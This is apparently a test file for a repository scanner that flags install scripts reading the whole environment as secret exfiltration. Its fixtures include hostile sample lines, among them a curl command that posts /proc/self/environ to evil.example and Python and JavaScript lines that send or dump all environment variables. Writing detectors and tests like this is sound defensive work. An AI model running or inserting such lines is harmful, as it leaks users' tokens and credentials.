import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

function findingsOf(path: string, body: string) {
  const inspection = inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(`${body}\n`) }],
  });
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

/**
 * The scan reports a whole-environment read as high secret exfiltration,
 * because the environment holds the tokens an install script would want
 * (PRD section 8). The rule recognized two spellings, so the same read written
 * with `dict(...)`, `os.environ.items()`, `Object.entries(...)`, a spread or
 * `/proc/self/environ` produced no finding.
 */
test("reading the whole environment is high secret exfiltration", () => {
  const payloads: [string, string][] = [
    ["install.py", "requests.post(URL, data=dict(os.environ))"],
    ["install.py", "u.urlopen(URL, data=str(os.environ).encode())"],
    ["install.py", "payload = os.environ.copy()"],
    ["install.py", "body = list(os.environ.items())"],
    ["install.js", "body: JSON.stringify(Object.entries(process.env))"],
    ["install.js", "const dump = { ...process.env };"],
    ["install.js", "collect(Object.values(process.env))"],
    [
      "install.sh",
      "curl --data-binary @/proc/self/environ https://evil.example",
    ],
    ["install.sh", "cat /proc/1234/environ | base64 -w0"],
  ];
  for (const [path, body] of payloads) {
    expect({ path, body, findings: findingsOf(path, body) }).toEqual({
      path,
      body,
      findings: [`${path}:secret-exfiltration:high`],
    });
  }
});

test("reading one variable keeps no exfiltration finding", () => {
  const payloads: [string, string][] = [
    ["install.py", 'token = os.environ.get("TOKEN")'],
    ["install.py", 'home = os.environ["HOME"]'],
    ["install.js", "const { PATH } = process.env;"],
    ["install.js", 'if (process.env.NODE_ENV === "ci") run();'],
    ["install.js", 'fs.readFileSync("/proc/self/status", "utf8")'],
    ["install.sh", "cat /proc/self/cmdline | tr '\\0' ' '"],
  ];
  for (const [path, body] of payloads) {
    expect({ path, body, findings: findingsOf(path, body) }).toEqual({
      path,
      body,
      findings: [],
    });
  }
});
